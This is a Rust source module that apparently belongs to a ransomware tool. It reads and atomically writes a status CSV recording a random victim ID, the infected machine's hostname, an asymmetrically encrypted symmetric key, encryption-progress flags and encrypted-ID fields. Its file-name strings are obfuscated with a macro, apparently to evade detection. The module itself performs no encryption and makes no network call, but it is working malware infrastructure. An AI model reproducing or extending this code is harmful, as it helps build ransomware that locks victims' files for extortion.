use csv::{ReaderBuilder, WriterBuilder};
use log::{debug, error, info};
use rand::{RngExt, distr::Alphanumeric};
use serde::{Deserialize, Serialize};
use std::{
    fs::{self, File},
    path::Path,
    sync::LazyLock,
};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Status {
    pub id: String,
    pub hostname: String,
    pub asymmetrically_encrypted_symmetric_key: String,
    pub encryption_started: bool,
    pub encryption_complete: bool,
    pub symmetrically_encrypted_id: String,
    pub symmetrically_encrypted_id_nonce: String,
    pub symmetrically_encrypted_id_tag: String,
    pub encryption_aad: String,
}

pub static STATUS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("status.csv"));
pub static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));

pub const ENCRYPTION_AAD: &str = "Cartier and Tiffany";

pub fn import_status_csv(path: &Path) -> Result<Option<Status>, String> {
    let file = match File::open(path.join(&*STATUS_FILENAME)) {
        Ok(file) => {
            info!("Existing CSV file found: {file:?}");
            file
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            info!("Existing CSV file not found: {error}");
            return Ok(None);
        }
        Err(error) => {
            error!("Failed to open CSV file: {error}");
            return Err(format!("Failed to open status CSV: {error}"));
        }
    };
    let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
    let mut rows = reader.deserialize();
    let Some(row) = rows.next() else {
        error!("Status CSV exists but contains no records (truncated?)");
        return Err("Status CSV exists but contains no records".to_string());
    };
    let status: Status = row.map_err(|error| {
        error!("Failed to parse row to status: {error}");
        format!("Failed to parse status CSV: {error}")
    })?;
    debug!("Successfully parsed row to status: {status:?}");
    if rows.next().is_some() {
        error!("Status CSV contains more than one record");
        return Err("Status CSV contains more than one record".to_string());
    }
    Ok(Some(status))
}

pub fn export_status_csv(path: &Path, status: &Status) -> Result<(), String> {
    let status_file_path = path.join(&*STATUS_FILENAME);
    let temp_file_path = path.join(format!("{}.tmp", *STATUS_FILENAME));

    let file = File::create(&temp_file_path)
        .map_err(|e| format!("Error accessing filesystem to write status CSV: {e}"))?;
    let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
    writer
        .serialize(status)
        .map_err(|e| format!("Failed to serialize status: {e}"))?;
    let file = writer
        .into_inner()
        .map_err(|e| format!("Failed to flush status to file: {e}"))?;
    file.sync_all()
        .map_err(|e| format!("Failed to sync status to file: {e}"))?;
    drop(file);
    fs::rename(&temp_file_path, &status_file_path)
        .map_err(|e| format!("Failed to replace status CSV: {e}"))?;
    Ok(())
}

pub fn create_status() -> Status {
    let status = Status {
        id: get_id(),
        hostname: get_hostname(),
        asymmetrically_encrypted_symmetric_key: String::new(),
        encryption_started: false,
        encryption_complete: false,
        symmetrically_encrypted_id: String::new(),
        symmetrically_encrypted_id_nonce: String::new(),
        symmetrically_encrypted_id_tag: String::new(),
        encryption_aad: String::from(ENCRYPTION_AAD),
    };
    debug!("Created new status: {status:?}");
    status
}

fn sanitize_hostname(raw: &str) -> Option<String> {
    let cleaned: String = raw
        .chars()
        .take(32)
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '.' || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect();
    (!cleaned.is_empty()).then_some(cleaned)
}

fn get_hostname() -> String {
    const FALLBACK: &str = "HostnameError";
    let raw = match hostname::get() {
        Ok(name) => {
            debug!("Got hostname: {}", name.display());
            name.to_string_lossy().into_owned()
        }
        Err(error) => {
            error!("Error getting hostname: {error}");
            return String::from(FALLBACK);
        }
    };
    sanitize_hostname(&raw).unwrap_or_else(|| String::from(FALLBACK))
}

fn get_id() -> String {
    rand::rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect()
}
